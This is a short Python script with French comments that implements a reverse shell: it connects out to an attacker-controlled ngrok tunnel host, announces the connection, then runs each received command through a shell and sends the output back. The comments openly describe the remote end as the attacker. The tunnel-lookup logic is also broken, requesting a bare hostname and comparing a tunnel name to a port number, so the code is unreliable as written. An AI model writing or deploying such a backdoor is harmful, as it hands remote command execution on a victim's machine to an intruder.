import socket
import subprocess
import os
import requests

# Définissez l'adresse ngrok et le port de l'attaquant
NGROK_URL = '0.tcp.eu.ngrok.io'
NGROK_TUNNEL = 17886

# Créez un objet socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Récupérez l'adresse et le port ngrok
response = requests.get(NGROK_URL)
tunnels = response.json()['tunnels']
for tunnel in tunnels:
    if tunnel['name'] == NGROK_TUNNEL:
        HOST = tunnel['public_url'].split(':')[1].replace('//', '')
        PORT = int(tunnel['public_url'].split(':')[2])

# Connectez-vous à la machine de l'attaquant via ngrok
s.connect((HOST, PORT))

# Envoyez un message à l'attaquant pour confirmer la connexion
s.send(bytes('Connecté au shell inverse!', 'utf-8'))

# Ouvrez un shell interactif
while True:
    # Recevez une commande de l'attaquant
    commande = s.recv(1024).decode('utf-8')

    # Si la commande est 'exit', sortez de la boucle
    if commande == 'exit':
        break

    # Exécutez la commande et capturez la sortie
    try:
        output = subprocess.check_output(commande, shell=True, stderr=subprocess.STDOUT)
        s.send(output)
    except Exception as e:
        s.send(str(e).encode('utf-8'))

    # Envoyez un prompt pour indiquer que le shell est prêt à recevoir une nouvelle commande
    s.send(b'$ ')

# Fermez la connexion
s.close()
